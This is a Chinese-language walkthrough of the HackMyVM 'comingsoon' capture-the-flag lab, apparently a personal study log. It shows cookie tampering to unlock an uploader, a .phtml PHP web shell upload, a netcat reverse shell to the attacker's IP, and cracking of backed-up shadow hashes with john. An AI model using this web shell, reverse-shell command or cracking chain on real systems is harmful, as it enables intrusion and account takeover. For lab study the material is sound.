刚开始没有IP
单用户修改密码也需要输入用户密码，不能改
/boot/grub/grub.cfg配置文件下
```c

```
看了wp，才知道root用户密码ToyStory3，进去后也没有dhclient命令获取ip
只能换一种方式，编辑vim /etc/network/interface
[Linux(Debian)网卡设置\_debian auto eth0-CSDN博客](https://blog.csdn.net/willhuo/article/details/79610260)

|   |   |   |
|---|---|---|
|comingsoon|easy|前端分析、文件上传绕过、提示信息利用、shadow 爆破、hydra 使用、|

# 主机发现
```C
sudo netdiscover -i eth0 -r 192.168.44.133/24
┌──(kali㉿kali)-[~]
└─$ fping -aqg 192.168.44.0/24
```
# 服务探测
```C
sudo nmap -sV -A -T 4 -p- 192.168.44.137
```
只有22和80
# 目录爆破
```C
http://192.168.44.137/notes.txt
Dave,

Last few jobs to do...

Set ssh to use keys only (passphrase same as the password)

Just need to sort the images out:
resize and scp them or using the built-in image uploader.

Test the backups and delete anything not needed.

Apply an https certificate.

Cheers,

Webdev

翻译

戴夫，

最后几项工作要做...

将 ssh 设置为仅使用密钥（密码与密码相同）

只需要对图像进行排序：
调整大小并对其进行 scp 或使用内置图像上传器。

测试备份并删除不需要的任何内容。

申请https证书。

干杯，

网络开发者


http://192.168.44.137/index.php
右键检查源码看到提示

 Upload images link if EnableUploader set 
 翻译
 如果设置了 EnableUploader，则上传图像链接

```


检查当前页面的cookie信息，发现base64编码的东西
```css
RW5hYmxlVXBsb2FkZXIK 
ZmFsc2UK
解码后
EnableUploader
false
```

综上所述，把false改成true编码后`dHJ1ZQ==`，就会出现文件上传的入口
http://192.168.44.137/5df03f95b4ff4f4b5dabe53a5a1e15d7.php
burp抓包,这里后端使用黑名单限制了php后缀的上传，尝试使用phtml后缀被解析成功。

```
POST /5df03f95b4ff4f4b5dabe53a5a1e15d7.php HTTP/1.1
Host: 192.168.44.137
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------30594177056923721121592264423
Content-Length: 379
Origin: http://192.168.44.137
Connection: close
Referer: http://192.168.44.137/5df03f95b4ff4f4b5dabe53a5a1e15d7.php
Cookie: RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ==
Upgrade-Insecure-Requests: 1

-----------------------------30594177056923721121592264423
Content-Disposition: form-data; name="fileToUpload"; filename="1.phtml"
Content-Type: image/png
<?php system($_GET['cmd']);?>
-----------------------------30594177056923721121592264423
Content-Disposition: form-data; name="submit"

Upload Image
-----------------------------30594177056923721121592264423--
```

命令执行
```c
http://192.168.44.137/assets/img/1.phtml?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

# nc反弹shell
```css
http://192.168.44.137/assets/img/1.phtml?cmd=nc -e /bin/sh 192.168.44.128 9001
```

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
或者
script /dev/null -c bash
export TERM=xterm
Ctrl+z快捷键
stty raw -echo;fg
reset
```

# 提权
目前看啥都没权限
只有/var/backups/目录下有个备份文件backup.tar.gz有用
```css
www-data@comingsoon:/var/backups$ cp backup.tar.gz /tmp
www-data@comingsoon:/tmp$ tar -zxvf backup.tar.gz
www-data@comingsoon:/tmp$ cat etc/shadow
```

```c
root:$y$j9T$/E0VUDL7uS9RsrvwmGcOH0$LEB/7ERUX9bkm646n3v3RJBxttSVWmTBvs2tUjKe9I6:18976:0:99999:7:::
scpuser:$y$j9T$rVt3bxjp6uYKKYJbYU2Zq0$Ysn02LrCwTUB7iQdRiROO7/WQi8JSGtwLZllR54iX0.:18976:0:99999:7:::
```
爆破
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ john -w=../rockyou.txt comningsoon --format=crypt 

tigger           (scpuser)  
```
切换用户
```c
www-data@comingsoon:/home$ su scpuser //tigger

scpuser@comingsoon:~$ cat user.txt
cat user.txt
HMV{user:comingsoon.hmv:58842fc1a7}

```
查看老密码
```c
scpuser@comingsoon:~$ cat .oldpasswords
cat .oldpasswords
Previous root passwords just incase they are needed for a backup\restore

Incredibles2
Paddington2
BigHero6
101Dalmations

```
参考这个链接才知道老密码的用处,原来密码是带有数字的动画电影名字：

https://28right.blogspot.com/2021/12/hackmyvm-comingsoon.html
生成单词列表
```css
curl https://www.rottentomatoes.com/top/bestofrt/top_100_animation_movies/|grep ")</a>"|sed 's/[(].*$//'|tr -d ' '> wordlist
```

应该上面的链接已经失效了，也知道思路了。这里就直接拿别人的密码登录了。

```
root:ToyStory3
```

```c
root@comingsoon:~# cat root.txt
cat root.txt
HMV{root:comingsoon.hmv:2339dc81ca}

```